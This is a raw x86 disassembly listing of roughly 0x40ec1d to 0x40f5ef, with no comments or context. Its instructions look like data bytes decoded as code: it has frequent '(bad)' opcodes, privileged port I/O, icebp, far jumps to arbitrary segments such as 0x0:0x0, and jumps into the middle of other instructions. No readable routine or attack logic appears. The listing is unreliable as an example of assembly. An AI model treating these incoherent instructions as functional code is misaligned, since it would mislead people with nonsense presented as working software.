  40ec1d:	mov    esp,edi
  40ec1f:	sub    BYTE PTR [esp+ecx*1-0x43],bl
  40ec23:	es mov edi,0xe65e2bfb
  40ec29:	popf   
  40ec2a:	jp     0x40ec2d
  40ec2c:	add    BYTE PTR [ebx+0x75f47814],cl
  40ec32:	or     DWORD PTR [ebx],ebx
  40ec34:	in     eax,dx
  40ec35:	add    esp,esi
  40ec37:	add    BYTE PTR [ebp-0x2903b7b],cl
  40ec3d:	push   DWORD PTR [edx+0x3d400000]
  40ec43:	out    0xf8,eax
  40ec45:	jmp    0x3e4a14
	...
  40ec66:	add    BYTE PTR [eax],al
  40ec68:	outs   dx,DWORD PTR ds:[esi]
  40ec69:	call   0xac4a7579
  40ec6e:	std    
  40ec6f:	jne    0x40ec4d
  40ec71:	jg     0x40ecb6
  40ec73:	les    eax,FWORD PTR [edx]
  40ec75:	push   ebp
  40ec76:	push   eax
  40ec77:	push   0x4166a4
  40ec7c:	mov    WORD PTR [ecx-0x2],ds
  40ec7f:	add    BYTE PTR [esi+eiz*1-0x535ec429],ah
  40ec86:	jb     0x40ec8e
  40ec88:	add    cl,BYTE PTR [edi+ebx*1-0x46ff5a32]
  40ec8f:	out    dx,al
  40ec90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec91:	add    BYTE PTR [eax],al
  40ec93:	(bad)  
  40ec94:	icebp  
  40ec95:	sar    bl,1
  40ec97:	dec    DWORD PTR ds:0x7affc556
  40ec9d:	push   esi
  40ec9e:	cmp    esi,DWORD PTR [ebp+0x74]
  40eca1:	xor    dl,al
  40eca3:	pop    esi
  40eca4:	retf   
  40eca5:	popa   
  40eca6:	mov    ebx,0x579715c1
  40ecab:	mov    ebp,DWORD PTR [ecx+0x19]
  40ecae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecaf:	test   DWORD PTR [edx+edx*1-0x68f2fbc1],0x23da5651
  40ecba:	ja     0x40ecdf
  40ecbc:	lods   eax,DWORD PTR ds:[esi]
  40ecbd:	xchg   edi,eax
  40ecbe:	add    al,BYTE PTR [eax]
  40ecc0:	and    eax,0xd002eaa
  40ecc5:	sbb    al,0x47
  40ecc7:	and    al,0x1
  40ecc9:	xchg   DWORD PTR [ebp+0x74],ebp
	...
  40ece7:	add    BYTE PTR [eax],al
  40ece9:	add    BYTE PTR ds:0x254fc522,al
  40ecef:	cwde   
  40ecf0:	lods   al,BYTE PTR ds:[esi]
  40ecf1:	dec    BYTE PTR [edx]
  40ecf3:	sbb    eax,0xe81d2440
  40ecf8:	sbb    DWORD PTR [ecx],eax
  40ecfa:	outs   dx,BYTE PTR ds:[esi]
  40ecfc:	push   eax
  40ecfd:	mov    eax,0x8002990c
  40ed02:	jne    0x40ed6d
  40ed04:	mov    ecx,0x7b090d42
  40ed09:	inc    ebx
  40ed0a:	xor    DWORD PTR ds:0xb9295b7b,eax
  40ed10:	stos   DWORD PTR es:[edi],eax
  40ed11:	adc    al,0x9
  40ed13:	test   eax,0x59880042
  40ed18:	sbb    cl,BYTE PTR ss:[eax+0x5d0be7e5]
  40ed1f:	xor    al,0x48
  40ed21:	and    al,0x9
  40ed23:	or     DWORD PTR [edi+0x43],edi
  40ed26:	jmp    0x19ce3fe7
  40ed2b:	lds    ecx,FWORD PTR [esi]
  40ed2d:	call   0x329ed82
  40ed32:	or     eax,0x4a80e997
  40ed37:	stos   DWORD PTR es:[edi],eax
  40ed38:	pop    edi
  40ed39:	dec    eax
  40ed3a:	xor    DWORD PTR [edx+ebp*2],edx
  40ed3d:	lods   al,BYTE PTR ds:[esi]
  40ed3e:	jae    0x40ed3b
  40ed40:	ins    BYTE PTR es:[edi],dx
  40ed41:	jg     0x40edad
  40ed43:	stos   DWORD PTR es:[edi],eax
  40ed44:	call   0x6d3c3d31
  40ed49:	xchg   DWORD PTR [edx-0x55],ebx
  40ed4c:	call   0x40edd1
	...
  40ed69:	add    BYTE PTR [eax],al
  40ed6b:	add    dh,dl
  40ed6d:	jecxz  0x40ed6f
  40ed6f:	add    eax,eax
  40ed71:	lock mov eax,0xf8e3beac
  40ed77:	jle    0x40ed4f
  40ed79:	jecxz  0x40ed67
  40ed7b:	jle    0x40edfb
  40ed7d:	in     al,0xa0
  40ed7f:	add    BYTE PTR ds:0xee882600,cl
  40ed85:	inc    edi
  40ed86:	jmp    0xd03:0xe8fe0d03
  40ed8d:	cwde   
  40ed8e:	or     DWORD PTR [ebp+0xd],0x2937de00
  40ed95:	cld    
  40ed96:	popa   
  40ed97:	mov    bl,0xf2
  40ed99:	dec    edi
  40ed9a:	pushf  
  40ed9b:	add    cl,BYTE PTR ds:0x16e83c79
  40eda1:	out    dx,eax
  40eda2:	mov    eax,ds:0xb8e38e7e
  40eda7:	add    cl,BYTE PTR ds:0x4e7f1900
  40edad:	in     al,0x44
  40edaf:	jnp    0x40ee17
  40edb1:	in     al,0x3c
  40edb3:	pushf  
  40edb4:	mov    cl,BYTE PTR [ebx-0x17]
  40edb7:	add    eax,DWORD PTR [esi-0x9e83acd]
  40edbd:	scas   al,BYTE PTR es:[edi]
  40edbe:	cld    
  40edbf:	cld    
  40edc0:	xchg   edi,eax
  40edc1:	cmp    eax,ebp
  40edc3:	call   DWORD PTR [edi+0x5263ffd1]
  40edc9:	in     al,0x57
  40edcb:	and    DWORD PTR [esi],0xe9004c
	...
  40eded:	add    BYTE PTR ds:0x4c220c44,al
  40edf3:	add    ah,BYTE PTR cs:[eax+0x7e]
  40edf7:	addr16 in eax,dx
  40edf9:	call   0x6dcdee0c
  40edfe:	jb     0x40ee4a
  40ee00:	add    ecx,ebp
  40ee02:	push   cs
  40ee03:	js     0x40ee1c
  40ee05:	test   eax,0x62fa3517
  40ee0a:	retf   0xbe3
  40ee0d:	adc    ah,BYTE PTR [edx]
  40ee0f:	imul   ebp,ebp,0x8d000ee8
  40ee15:	ins    DWORD PTR es:[edi],dx
  40ee16:	xor    cl,BYTE PTR [edx+0x1]
  40ee19:	jmp    0xa958662c
  40ee1e:	out    0x34,eax
  40ee20:	cli    
  40ee21:	mov    edx,0x925e494e
  40ee26:	xchg   ebp,eax
  40ee27:	mov    ds:0xaa162b5c,eax
  40ee2c:	push   ebx
  40ee2d:	jb     0x40edd4
  40ee2f:	push   eax
  40ee30:	push   esi
  40ee31:	ins    BYTE PTR es:[edi],dx
  40ee32:	dec    esp
  40ee33:	lods   al,BYTE PTR ds:[esi]
  40ee34:	dec    edi
  40ee35:	inc    ebx
  40ee36:	adc    BYTE PTR [eax-0x55593037],bl
  40ee3c:	test   BYTE PTR [ecx+0x3c830e1d],ch
  40ee42:	mov    ch,0xfd
  40ee44:	je     0x40ee2b
  40ee46:	pop    ebx
  40ee47:	(bad)  [edi-0x3f]
  40ee4a:	addr16 mov ch,0x0
  40ee4d:	jmp    0xf22bb19d
	...
  40ee6e:	add    BYTE PTR [eax],al
  40ee70:	pop    esi
  40ee71:	cwde   
  40ee72:	mov    bl,0xa5
  40ee74:	adc    BYTE PTR [eax],al
  40ee76:	xor    ebp,DWORD PTR [ecx+0xc2b747]
  40ee7c:	or     DWORD PTR [ecx],ebp
  40ee7e:	jmp    0x40eed1
  40ee80:	cli    
  40ee81:	dec    esp
  40ee82:	lea    eax,[ebp+0x20]
  40ee85:	push   esp
  40ee86:	push   0x2
  40ee88:	mov    WORD PTR [esp+edi*8-0x1],?
  40ee8c:	repz sub bh,ch
  40ee8f:	test   edx,ebx
  40ee91:	out    dx,eax
  40ee92:	push   ds
  40ee93:	mov    ebp,DWORD PTR [ecx+0x5901a661]
  40ee99:	cmc    
  40ee9a:	mov    cl,BYTE PTR [ebp+0x5c]
  40ee9d:	dec    edi
  40ee9e:	push   0x15
  40eea0:	add    eax,0x5ee85d8c
  40eea5:	nop
  40eea6:	(bad)  
  40eea7:	(bad)  
  40eea8:	jp     0x40ee2f
  40eeaa:	jnp    0x40ee78
  40eeac:	xor    eax,0x1f01affd
  40eeb1:	lods   al,BYTE PTR ds:[esi]
  40eeb2:	push   esp
  40eeb3:	call   0x40604f
  40eeb8:	push   esi
  40eeb9:	mov    ebp,0xc1dd5e5d
  40eebe:	add    al,BYTE PTR [eax]
  40eec0:	jns    0x40eeec
  40eec2:	jmp    0x40ee47
  40eec4:	or     BYTE PTR [edi+edi*2-0x14],bl
  40eec8:	fdivr  st,st(6)
  40eeca:	(bad)  
  40eecb:	dec    DWORD PTR [ebx+0x55]
  40eece:	jae    0x40eed8
  40eed0:	fcomp  QWORD PTR ds:0xfffe
	...
  40eef2:	jecxz  0x40ef1c
  40eef4:	mov    edi,0x7b271775
  40eef9:	and    al,0xdc
  40eefb:	test   BYTE PTR [ecx],dl
  40eefd:	cmp    dh,dh
  40eeff:	cld    
  40ef00:	mov    cl,BYTE PTR [ebp-0x14]
  40ef03:	daa    
  40ef04:	and    DWORD PTR [edx+esi*8],0xffffffff
  40ef08:	(bad)  
  40ef09:	inc    DWORD PTR [edx+ecx*1]
  40ef0c:	adc    eax,0xe6be3f5f
  40ef11:	jmp    0x40ef20
  40ef13:	sub    eax,DWORD PTR [eax+eax*1]
  40ef16:	and    eax,0xd000047
  40ef1b:	xor    al,0x3f
  40ef1d:	and    al,0x11
  40ef1f:	or     eax,0xcb9a5004
  40ef24:	push   edx
  40ef25:	push   ss
  40ef26:	dec    ebp
  40ef27:	xchg   edi,eax
  40ef28:	test   ebx,eax
  40ef2a:	sbb    edx,eax
  40ef2c:	jge    0x40ef12
  40ef2e:	loopne 0x40ef04
  40ef30:	(bad)  
  40ef31:	jmp    ecx
  40ef33:	sbb    eax,0x70dc5097
  40ef38:	sbb    al,0xc
  40ef3a:	push   0x6b
  40ef3c:	cli    
  40ef3d:	out    0x60,eax
  40ef3f:	fiadd  DWORD PTR [ebx]
  40ef41:	add    BYTE PTR [eax-0x18b059a5],cl
  40ef47:	ret    
  40ef48:	call   0x3d8a:0xa9e148f6
  40ef4f:	and    esi,DWORD PTR [ecx-0x3d3aee8c]
  40ef55:	jmp    0x0:0x0
	...
  40ef74:	in     al,dx
  40ef75:	sbb    eax,0xfe8efc40
  40ef7a:	div    BYTE PTR [ebp+0xe]
  40ef7d:	(bad)  
  40ef7e:	not    BYTE PTR [edi-0x43]
  40ef81:	mov    BYTE PTR [ecx+0xe9a0574],ch
  40ef87:	dec    esp
  40ef88:	and    ebx,ecx
  40ef8a:	add    eax,DWORD PTR [ebx-0x17af6a37]
  40ef90:	loope  0x40eff4
  40ef92:	add    al,BYTE PTR [eax]
  40ef94:	mov    ebp,0xcfc94898
  40ef99:	xchg   ebp,eax
  40ef9a:	add    dl,BYTE PTR [ebp-0x6a]
  40ef9d:	mov    ch,0x52
  40ef9f:	push   ecx
  40efa0:	inc    ebx
  40efa1:	push   es
  40efa2:	ja     0x40efe8
  40efa4:	ror    DWORD PTR [ecx],1
  40efa6:	sbb    al,0xc8
  40efa8:	or     eax,0xb503e900
  40efad:	jb     0x40ef4a
  40efaf:	test   eax,0x7f987bbb
  40efb4:	mov    eax,0x517ced2c
  40efb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efba:	adc    al,BYTE PTR [ebx]
  40efbc:	aaa    
  40efbd:	add    BYTE PTR [edx-0x46],dh
  40efc0:	mov    dl,0x3d
  40efc2:	jne    0x40efc8
  40efc4:	or     eax,0x8b7f707b
  40efc9:	sub    eax,0x887551ef
  40efce:	xor    DWORD PTR [ebx],eax
  40efd0:	or     eax,0xd3492d7b
  40efd5:	mov    eax,0x4f29
	...
  40eff6:	xchg   esi,eax
  40eff7:	xchg   esp,eax
  40eff8:	imul   esp,DWORD PTR [edi],0x2e9a0015
  40effe:	std    
  40efff:	sbb    ecx,ebp
  40f001:	sbb    eax,DWORD PTR [ebp+0x0]
  40f004:	jmp    0x1100ee0c
  40f009:	out    dx,al
  40f00a:	inc    esi
  40f00b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f00c:	sbb    eax,0xab74fd9d
  40f011:	sti    
  40f012:	ret    0xe919
  40f015:	sbb    eax,0xfb7ba70c
  40f01a:	sub    dl,dl
  40f01c:	inc    DWORD PTR [ebx]
  40f01e:	or     eax,0x92f287d
  40f023:	repnz sub BYTE PTR [ebp-0x3a458db],bl
  40f02a:	push   0xffffffb8
  40f02c:	call   0xf9d8fd34
  40f031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f032:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f034:	int    0x2e
  40f036:	adc    eax,0x559ba07a
  40f03b:	mov    ebx,0xc28703e7
  40f040:	call   DWORD PTR [ecx]
  40f042:	dec    edx
  40f043:	ret    0xe903
  40f046:	xchg   ecx,eax
  40f047:	sahf   
  40f048:	call   FWORD PTR [ebx+eax*8]
  40f04b:	ds je  0x40f038
  40f04e:	shl    DWORD PTR [esi-0x3e],0x3
  40f052:	mov    eax,0xa303c34e
  40f057:	dec    esi
  40f058:	ret    
  40f059:	sbb    al,0x0
	...
  40f077:	add    BYTE PTR [eax],ah
  40f079:	fwait
  40f07a:	or     BYTE PTR [ebp-0x1abb84ee],0x39
  40f081:	repz ficom DWORD PTR [edi]
  40f084:	fdivr  QWORD PTR [eax+0x5c]
  40f087:	gs jbe 0x40f098
  40f08a:	pcmpgtw mm5,mm1
  40f08d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f08e:	(bad)  
  40f08f:	jmp    0xba3d2c8f
  40f094:	xchg   BYTE PTR [eax-0x7],bl
  40f097:	inc    esi
  40f098:	mov    ch,0x82
  40f09a:	mov    edi,0xff58daee
  40f09f:	call   0xe1856bb2
  40f0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0a5:	imul   edi,esi,0x4c737526
  40f0ab:	icebp  
  40f0ac:	fisttp WORD PTR [edi-0x77]
  40f0af:	lods   al,BYTE PTR ds:[esi]
  40f0b0:	data16 sahf 
  40f0b2:	jmp    0x8ae665c4
  40f0b7:	test   BYTE PTR [esi],ah
  40f0b9:	jns    0x40f0aa
  40f0bb:	xchg   esi,eax
  40f0bc:	cdq    
  40f0bd:	mov    ah,0xe7
  40f0bf:	popa   
  40f0c0:	or     DWORD PTR [eax],eax
  40f0c2:	add    BYTE PTR [ebp-0x32],ah
  40f0c5:	sub    al,0xa
  40f0c7:	aas    
  40f0c8:	mov    eax,ds:0xee8c9c8
  40f0cd:	icebp  
  40f0ce:	cmc    
  40f0cf:	sbb    ch,BYTE PTR [edx+0x5461bff2]
  40f0d5:	cwde   
  40f0d6:	mov    BYTE PTR [eax],al
  40f0d8:	dec    ecx
  40f0d9:	mov    BYTE PTR [edi+0x75],al
	...
  40f0f7:	add    BYTE PTR [eax],al
  40f0f9:	add    BYTE PTR [ebx+eiz*1+0x72dff45c],dl
  40f100:	jb     0x40f113
  40f102:	mov    esp,0xf40674fb
  40f107:	xchg   ebx,eax
  40f108:	pop    esp
  40f109:	add    DWORD PTR [eax],esp
  40f10b:	add    DWORD PTR [esi-0x15],eax
  40f10e:	xchg   edi,eax
  40f10f:	cdq    
  40f110:	sar    DWORD PTR [edi-0xb],0x5c
  40f114:	jae    0x40f122
  40f116:	sbb    edi,edx
  40f118:	out    0xe8,eax
  40f11a:	mov    dh,0xa5
  40f11c:	(bad)  
  40f11d:	jmp    DWORD PTR [eax]
  40f11f:	mov    esp,0xeefb4072
  40f124:	out    dx,eax
  40f125:	mov    esi,DWORD PTR [ecx-0x138a0273]
  40f12b:	adc    DWORD PTR [ebx-0x5],0xffffffdb
  40f12f:	pop    esp
  40f130:	mov    al,bl
  40f132:	leave  
  40f133:	out    dx,al
  40f134:	out    0xe8,eax
  40f136:	inc    eax
  40f137:	add    al,BYTE PTR [eax]
  40f139:	add    cl,ch
  40f13b:	out    dx,al
  40f13c:	sti    
  40f13d:	call   0x3e4876
  40f142:	scas   al,BYTE PTR es:[edi]
  40f143:	shr    cl,0x2e
  40f146:	jmp    0x40f136
  40f148:	or     edx,DWORD PTR [eax+0x1b]
  40f14b:	bswap  eax
  40f14d:	adc    ah,BYTE PTR [ecx+eax*1-0x7b]
  40f151:	rol    BYTE PTR [eax-0x3ba7445],0x83
  40f158:	xchg   esp,eax
  40f159:	add    esp,DWORD PTR [ecx+eax*1]
  40f15c:	cmp    eax,ebx
	...
  40f17a:	add    BYTE PTR [eax],al
  40f17c:	xchg   ecx,eax
  40f17d:	sub    cl,0xb1
  40f180:	imul   ebp,edi,0xfed0e8e7
  40f186:	(bad)  
  40f187:	jmp    FWORD PTR [ecx-0x10]
  40f18a:	sti    
  40f18b:	call   0xfeeca89d
  40f190:	jmp    0xbce2:0x435ec408
  40f197:	rol    DWORD PTR ds:0xe18b4f97,0x7
  40f19e:	push   ebp
  40f19f:	push   ebx
  40f1a0:	arpl   WORD PTR [esi],cx
  40f1a2:	jns    0x40f1e8
  40f1a4:	(bad)
  40f1a7:	xchg   edi,eax
  40f1a8:	or     eax,0xe3e80297
  40f1ad:	mov    ah,BYTE PTR [ebp-0x43796902]
  40f1b3:	inc    esp
  40f1b4:	mov    ds:0x21f57f96,al
  40f1b9:	arpl   WORD PTR [ecx+0x4c],di
  40f1bc:	xchg   ebp,eax
  40f1bd:	add    BYTE PTR [ebx+esi*1],cl
  40f1c0:	pop    edi
  40f1c1:	and    esp,eax
  40f1c3:	pop    esi
  40f1c4:	jp     0x40f20b
  40f1c6:	adc    cl,0x0
  40f1c9:	repz js 0x40f1e7
  40f1cc:	cmp    al,0x22
  40f1ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1cf:	cmp    bl,BYTE PTR [esi-0x37]
  40f1d2:	loope  0x40f23d
  40f1d4:	stc    
  40f1d5:	cmp    eax,0x5d880830
  40f1da:	dec    BYTE PTR [edi+0x52]
  40f1dd:	ret    
  40f1de:	dec    edx
  40f1df:	push   ss
	...
  40f1fc:	add    BYTE PTR [eax],al
  40f1fe:	int    0x96
  40f200:	add    ebx,0x73c31411
  40f206:	add    al,0x1a
  40f208:	mov    esi,0x3111f617
  40f20d:	jecxz  0x40f245
  40f20f:	call   0xe84c:0x972244bc
  40f216:	and    eax,0x870003ef
  40f21b:	push   ebx
  40f21c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f21d:	pop    esi
  40f21e:	imul   ecx,DWORD PTR [esi+0x9c1bb],0xffffffe9
  40f225:	dec    esi
  40f226:	xchg   BYTE PTR [ecx+ebp*2+0x3a000527],dl
  40f22d:	dec    esi
  40f22e:	popa   
  40f22f:	in     eax,dx
  40f230:	imul   esp,DWORD PTR [edi],0xd53f0011
  40f236:	fld    TBYTE PTR ds:0xf859a4ed
  40f23c:	shl    ah,0xd4
  40f23f:	add    ecx,ebp
  40f241:	js     0x40f1f5
  40f243:	jge    0x40f1e3
  40f245:	das    
  40f246:	adc    esi,ebp
  40f248:	test   al,0x99
  40f24a:	jmp    0x7118:0x40f82b76
  40f251:	add    al,0xd
  40f253:	add    BYTE PTR [ecx+0x7da3971a],dl
  40f259:	dec    esi
  40f25a:	xchg   eax,ecx
  40f25c:	and    BYTE PTR [edx+0x55],0x1
  40f260:	jmp    0x40f2de
	...
  40f27d:	add    BYTE PTR [eax],al
  40f27f:	add    BYTE PTR [edi-0x69],cl
  40f282:	neg    BYTE PTR [ecx]
  40f284:	or     eax,0xd048118
  40f289:	add    BYTE PTR [edx],bl
  40f28b:	les    esi,FWORD PTR [edx+0x50]
  40f28e:	push   ebx
  40f28f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f290:	arpl   WORD PTR [edx-0x5e],ax
  40f293:	inc    esi
  40f294:	dec    edi
  40f295:	clc    
  40f296:	call   0x97d578e9
  40f29b:	push   edx
  40f29c:	jecxz  0x40f312
  40f29e:	mov    ds:0x8017d2a7,eax
  40f2a3:	add    al,0xd
  40f2a5:	add    BYTE PTR [ecx],dl
  40f2a7:	xor    al,0x36
  40f2a9:	mov    ds:0x7d527915,eax
  40f2ae:	pop    ds
  40f2af:	xor    BYTE PTR [ecx],al
  40f2b1:	ja     0x40f25e
  40f2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b5:	or     bh,BYTE PTR [edx-0x554f2f]
  40f2bb:	dec    BYTE PTR [ebx-0x8208b2f]
  40f2c1:	sub    edi,esp
  40f2c3:	pop    ebx
  40f2c4:	div    BYTE PTR [ebp+0x54]
  40f2c7:	icebp  
  40f2c8:	ja     0x40f2cb
  40f2ca:	mov    ebp,DWORD PTR [eax-0x3eaf057b]
  40f2d0:	sbb    BYTE PTR [ecx+0x62dde900],bh
  40f2d6:	pop    ebp
  40f2d7:	mov    al,0xcc
  40f2d9:	(bad)  
  40f2da:	call   DWORD PTR [edi]
  40f2dc:	mov    WORD PTR [esi],fs
  40f2de:	and    al,0xe1
  40f2e0:	push   cs
  40f2e1:	dec    edi
  40f2e2:	push   esi
  40f2e3:	add    BYTE PTR ds:[eax],al
	...
  40f302:	std    
  40f303:	jmp    0xee239c8c
  40f308:	push   0xffffffa9
  40f30a:	sbb    DWORD PTR [edi-0x9],esi
  40f30d:	ss push 0x76e1242e
  40f313:	mov    eax,ecx
  40f315:	call   0x6d306a28
  40f31a:	mov    eax,0x4ebb042b
  40f31f:	xchg   ebp,eax
  40f320:	es mov edi,0xe8ff8916
  40f326:	push   cs
  40f327:	ja     0x40f2ef
  40f329:	inc    ecx
  40f32a:	cmp    al,0xa7
  40f32c:	dec    BYTE PTR [esi-0x30]
  40f32f:	jne    0x40f308
  40f331:	push   ecx
  40f332:	push   esp
  40f333:	mov    bh,0x0
  40f335:	jmp    0xe82bb10e
  40f33a:	and    al,0x0
  40f33c:	push   0xe50
  40f341:	fimul  DWORD PTR [esi-0x66]
  40f344:	mov    bh,0x20
  40f346:	imul   esp,DWORD PTR [ecx+0x48d5b75e],0x4d0ee5c2
  40f350:	mov    eax,DWORD PTR [eax]
  40f352:	add    BYTE PTR [esi+0x56],cl
  40f355:	push   edi
  40f356:	mov    eax,ds:0x8c50fbe1
  40f35b:	ja     0x40f35b
  40f35d:	push   esp
  40f35f:	test   ebp,edx
  40f361:	cli    
  40f362:	repz pop ebp
  40f364:	mov    eax,esi
	...
  40f382:	add    BYTE PTR [eax],al
  40f384:	imul   eax,DWORD PTR [esi+0x376f2072],0xfb9fb9fc
  40f38e:	(bad)  
  40f38f:	call   edi
  40f391:	imul   ecx,DWORD PTR [ecx-0x7c7a6407],0xffffffd2
  40f398:	or     DWORD PTR [esi],ecx
  40f39a:	cmp    DWORD PTR [ebp+0x70],ecx
  40f39d:	or     cl,BYTE PTR [ecx]
  40f39f:	mov    eax,DWORD PTR [ecx]
  40f3a1:	hlt    
  40f3a2:	mov    BYTE PTR [ecx],al
  40f3a4:	aas    
  40f3a5:	mov    dh,0xe9
  40f3a7:	or     dl,ch
  40f3a9:	push   ebx
  40f3aa:	scas   eax,DWORD PTR es:[edi]
  40f3ab:	enter  0xfdb5,0x32
  40f3af:	shl    bl,0x3d
  40f3b2:	leave  
  40f3b3:	ret    0xfda8
  40f3b6:	push   eax
  40f3b7:	add    DWORD PTR [eax+0x27000699],0xffffffe6
  40f3be:	push   esi
  40f3bf:	je     0x40f3ee
  40f3c1:	ja     0x40f381
  40f3c3:	je     0x40f3de
  40f3c5:	sar    DWORD PTR [edi-0x28a25],cl
  40f3cb:	mov    bh,BYTE PTR [esp+eiz*8-0x5bf78b02]
  40f3d2:	out    0xf6,al
  40f3d4:	sbb    al,0xfb
  40f3d6:	dec    DWORD PTR [edx+0x75f47704]
  40f3dc:	sub    bl,cl
  40f3de:	mov    esi,0x67e74beb
  40f3e3:	call   0x0:0x8afffd24
	...
  40f406:	or     eax,0x2430abd2
  40f40b:	repnz mov ds:0xabdf8755,al
  40f411:	push   0x8a029845
  40f416:	into   
  40f417:	std    
  40f418:	adc    DWORD PTR [edx+0xd],ebp
  40f41b:	jg     0x40f499
  40f41d:	(bad)  
  40f41e:	cli    
  40f41f:	xchg   esi,eax
  40f420:	aad    0xbf
  40f422:	in     eax,0xa9
  40f424:	fwait
  40f425:	(bad)  
  40f426:	jmp    0x655:0x445b41e9
  40f42d:	add    BYTE PTR [eax+0x2e],al
  40f430:	scas   eax,DWORD PTR es:[edi]
  40f431:	push   eax
  40f432:	cmp    al,0x9
  40f434:	xchg   ecx,eax
  40f435:	inc    esp
  40f436:	leave  
  40f437:	push   es
  40f438:	sub    al,0x96
  40f43a:	or     eax,0x3e80297
  40f43f:	pop    ebp
  40f440:	mov    eax,ds:0x876e86fe
  40f445:	enter  0xab21,0x8d
  40f449:	inc    esp
  40f44a:	mov    eax,ds:0xbf32dbfc
  40f44f:	fcomp  DWORD PTR [edx+0x178488f5]
  40f455:	push   cs
  40f456:	inc    esp
  40f457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f458:	sahf   
  40f459:	jno    0x40f46f
  40f45b:	push   ds
  40f45c:	cmp    BYTE PTR [eax],cl
  40f45e:	test   BYTE PTR [ebp+ecx*4+0x33ae66c0],dl
  40f465:	call   0x44d36b
	...
  40f486:	add    BYTE PTR [eax],al
  40f488:	push   ds
  40f489:	xlat   BYTE PTR ds:[ebx]
  40f48a:	inc    eax
  40f48b:	leave  
  40f48c:	dec    edi
  40f48d:	xchg   edx,eax
  40f48e:	add    dl,BYTE PTR [ebp-0x7a]
  40f491:	xor    dh,BYTE PTR [ecx+edx*2]
  40f494:	jecxz  0x40f4b1
  40f496:	dec    eax
  40f497:	cld    
  40f498:	fnstsw WORD PTR [esi+eiz*1+0x1fff43e8]
  40f49f:	mov    ds:0x88307433,al
  40f4a4:	push   ebp
  40f4a5:	sub    esi,ebp
  40f4a7:	mov    cs,ecx
  40f4a9:	mov    ds:0xcddfdd82,eax
  40f4ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4af:	call   0xd91b:0x181a7a18
  40f4b6:	jnp    0x40f457
  40f4b8:	jl     0x40f4c3
  40f4ba:	bound  edi,QWORD PTR [eax]
  40f4bc:	add    eax,0xcd8cea89
  40f4c1:	stos   DWORD PTR es:[edi],eax
  40f4c2:	lock xor dh,ch
  40f4c5:	mov    ah,0xad
  40f4c7:	add    ecx,DWORD PTR ds:0xc442a8d3
  40f4cd:	ret    0x3ec
  40f4d0:	cmp    BYTE PTR [ebx-0x67517a34],cl
  40f4d6:	pop    ss
  40f4d7:	test   DWORD PTR [ecx+0x8],eax
  40f4da:	jmp    0x1d785813
  40f4df:	(bad)  
  40f4e0:	mov    eax,eax
  40f4e2:	adc    al,0xf2
  40f4e4:	aaa    
  40f4e5:	rcl    dl,0x8c
  40f4e8:	call   0x0:0x178e37
	...
  40f507:	add    BYTE PTR [eax],al
  40f509:	add    BYTE PTR ds:0xdcbdfa8,al
  40f50f:	add    BYTE PTR [edx-0x6c],dh
  40f512:	xchg   ecx,eax
  40f513:	xchg   esi,eax
  40f514:	sti    
  40f515:	pop    es
  40f516:	aas    
  40f517:	rol    BYTE PTR [ecx-0x32d61f1d],0x8c
  40f51e:	dec    ebx
  40f51f:	test   al,0xb5
  40f521:	fwait
  40f522:	imul   ebx,DWORD PTR [edi-0x57c57242],0x5d
  40f529:	leave  
  40f52a:	or     eax,0x67c57300
  40f52f:	or     edx,ebx
  40f531:	add    esi,DWORD PTR [edi+0x4efa0023]
  40f537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f538:	aas    
  40f539:	xor    DWORD PTR [esi+ebx*4+0x5e],ebp
  40f53d:	(bad)  
  40f53e:	icebp  
  40f53f:	mov    ah,ah
  40f541:	mov    esp,0xba000350
  40f546:	cmp    DWORD PTR [edx+0x803ef37],edi
  40f54c:	(bad)  
  40f54d:	jg     0x40f555
  40f54f:	test   al,0x67
  40f551:	es push cs
  40f553:	add    BYTE PTR [eax+0x43c97d7],cl
  40f559:	pusha  
  40f55a:	dec    edi
  40f55b:	or     BYTE PTR [ecx-0x3cc4e2b9],cl
  40f561:	push   ebx
  40f562:	std    
  40f563:	daa    
  40f564:	mov    al,0x5c
  40f566:	dec    eax
  40f567:	add    al,ch
  40f569:	mov    ecx,0xfa000138
	...
  40f58a:	add    BYTE PTR [eax],al
  40f58c:	cwde   
  40f58d:	fxch   st(1)
  40f58f:	xor    eax,0xe17c81e8
  40f594:	or     BYTE PTR [esi],bl
  40f596:	xor    eax,0x329c0360
  40f59b:	test   eax,0xe2e44387
  40f5a0:	push   ebx
  40f5a1:	or     BYTE PTR [ebp-0x33],bh
  40f5a4:	(bad)  
  40f5a5:	repnz pop es
  40f5a7:	adc    al,0xa2
  40f5a9:	(bad)  
  40f5aa:	push   ebx
  40f5ab:	icebp  
  40f5ac:	unpckhps xmm1,XMMWORD PTR [edi]
  40f5af:	push   0x4e
  40f5b1:	add    BYTE PTR [ebx],bh
  40f5b3:	sub    al,0x11
  40f5b5:	sete   BYTE PTR [ecx+0x66fc4b91]
  40f5bc:	mov    eax,ds:0xa952400e
  40f5c1:	sar    DWORD PTR [edi+0x648949a9],1
  40f5c7:	inc    ecx
  40f5c8:	xchg   ecx,eax
  40f5c9:	dec    ebx
  40f5ca:	cld    
  40f5cb:	add    bl,cl
  40f5cd:	mov    ah,0xbe
  40f5cf:	call   0x4232cb
  40f5d4:	test   BYTE PTR [esi],0x0
  40f5d7:	xor    edx,DWORD PTR [esi]
  40f5d9:	mov    edx,0xf6202452
  40f5de:	and    cl,BYTE PTR [ebx-0x3dc4f58b]
  40f5e4:	sbb    BYTE PTR [esi-0x6dc336cf],0x73
  40f5eb:	or     al,0x4c
  40f5ed:	rol    BYTE PTR [eax],cl
  40f5ef:	je     0x40f5f1
	...
